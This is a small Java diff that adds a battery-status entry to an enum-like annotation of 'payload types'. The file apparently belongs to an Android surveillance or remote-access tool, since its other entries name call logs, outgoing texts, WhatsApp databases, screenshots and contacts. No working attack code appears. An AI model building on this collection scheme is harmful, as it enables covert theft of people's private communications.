@@ -12,7 +12,8 @@ import java.lang.annotation.RetentionPolicy;
         PayloadTypes.GET_TEXT_MESSAGES_OUTBOX,
         PayloadTypes.GET_WHATSAPP_DATABASES,
         PayloadTypes.GET_SCREENSHOTS_COUNT,
-        PayloadTypes.GET_USER_CONTACTS})
+        PayloadTypes.GET_USER_CONTACTS,
+        PayloadTypes.GET_BATTERY_STATUS})
 
 public @interface PayloadTypes {
     int GET_CALL_LOGS = 0;
@@ -22,4 +23,5 @@ public @interface PayloadTypes {
     int GET_WHATSAPP_DATABASES = 4;
     int GET_SCREENSHOTS_COUNT = 5;
     int GET_USER_CONTACTS = 6;
+    int GET_BATTERY_STATUS = 7;
 }
